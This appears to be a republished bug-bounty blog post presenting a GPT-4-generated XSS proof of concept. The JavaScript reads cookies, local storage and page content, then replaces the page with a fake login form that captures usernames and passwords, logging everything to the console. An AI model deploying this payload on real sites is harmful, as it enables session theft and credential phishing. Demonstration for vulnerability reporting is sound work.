---
title: The Ultimate XSS PoC with ChatGPT-4
url: https://buaq.net/go-155343.html
source: unSafe.sh - 不安全
date: 2023-03-27
fetch_date: 2025-10-04T10:45:27.128870
---

# The Ultimate XSS PoC with ChatGPT-4

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

The Ultimate XSS PoC with ChatGPT-4

*2023-3-26 18:33:55
Author: [infosecwriteups.com(查看原文)](/jump-155343.htm)
阅读量:40
收藏*

---

## XSS to Demonstrate Stealing Cookies, Local Storage, and Page Content Generated with ChatGPT-4 🤖

Welcome, fellow vulnerability hunters! Today, we’re going to explore a simple yet powerful way to demonstrate Cross-Site Scripting (XSS) vulnerabilities using a Proof of Concept (PoC) generated with ChatGPT model GPT-4. Get ready to level up your ethical hacking skills!

Let’s start with a killer prompt that’ll set the foundation for our PoC:

> Create a single JavaScript file that achieves the following tasks to be embedded in my test web page:

Got it? Sweet! Now, let’s break it down into smaller tasks and tackle each one.

First, we’ll look at the JavaScript snippet used to log cookies, local storage, and DOM contents to the console.

**Here’s the code:**

```
console.log(`%cHacked Cookies: %c${document.cookie}`, ‘color: red’, ‘color: blue’);
console.log(`%cHacked Local Storage: %c${JSON.stringify(localStorage)}`, ‘color: red’, ‘color: blue’);
console.log(`%cHacked DOM Contents: %c${document.documentElement.innerHTML}`, ‘color: red’, ‘color: blue’);
```

🔎 **Explanation:** We use `console.log` to print messages to the browser’s console. We access cookies via `document.cookie`, local storage with `localStorage`, and DOM contents using `document.documentElement.innerHTML`.

## How it looks in the DevTools console 👀:

Next, we’ll create a **fake login page** to replace the current page content:

```
const fakeLoginPage = `
  <style>
    /* ...some CSS to style the login page... */
  </style>
  <form id="fakeLoginForm">
    <input type="text" name="username" placeholder="Username" />
    <input type="password" name="password" placeholder="Password" />
    <button type="submit">Login</button>
  </form>
`;

document.documentElement.innerHTML = fakeLoginPage;
```

🔎 **Explanation**: We define the **HTML** and **CSS** for our fake login page in a template string. Then, we replace the current page content using `document.documentElement.innerHTML`.

## How it looks rendered in the browser 👀:

Finally, we’ll log submitted **username/password** credentials to the console:

```
const form = document.getElementById('fakeLoginForm');

form.addEventListener('submit', (e) => {
  e.preventDefault();

const username = form.elements['username'].value;
  const password = form.elements['password'].value;

console.log(`%cHacked Username: %c${username}`, 'color: red', 'color: blue');
  console.log(`%cHacked Password: %c${password}`, 'color: red', 'color: blue');
});
```

🔎 **Explanation**: We access the form using `document.getElementById` and add an event listener for the `submit` event. To prevent the default form submission behavior, we call `e.preventDefault()`. Then, we extract the **username** and **password** values and log them to the console with the same formatting used earlier.

## How it looks in the DevTools console 👀:

Now that we have all the pieces, let’s combine them into a single JS file:

```
// Log cookies, local storage, and DOM contents
console.log(`%cHacked Cookies: %c${document.cookie}`, 'color: red', 'color: blue');
console.log(`%cHacked Local Storage: %c${JSON.stringify(localStorage)}`, 'color: red', 'color: blue');
console.log(`%cHacked DOM Contents: %c${document.documentElement.innerHTML}`, 'color: red', 'color: blue');

// Create a fake login page
const fakeLoginPage = `
  <style>
    /* ...some CSS to style the login page... */
  </style>
  <form id="fakeLoginForm">
    <input type="text" name="username" placeholder="Username" />
    <input type="password" name="password" placeholder="Password" />
    <button type="submit">Login</button>
  </form>
`;

document.documentElement.innerHTML = fakeLoginPage;

// Log form submissions to the console
const form = document.getElementById('fakeLoginForm');

form.addEventListener('submit', (e) => {
  e.preventDefault();

const username = form.elements['username'].value;
  const password = form.elements['password'].value;

console.log(`%cHacked Username: %c${username}`, 'color: red', 'color: blue');
  console.log(`%cHacked Password: %c${password}`, 'color: red', 'color: blue');
});
```

[Github repository](https://github.com/TakSec/XSS-PoCs) for this XSS PoC and others as they get added.

Voilà! You now have a powerful XSS PoC to demonstrate vulnerabilities in style. 🎉

Remember, the goal is to help developers understand the risks and fix security issues. Happy bug hunting, and keep making the web a safer place! 💻✨

文章来源: https://infosecwriteups.com/the-ultimate-xss-poc-with-chatgpt-4-2be606a13a2e?source=rss----7b722bfd1b8d--bug\_bounty
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)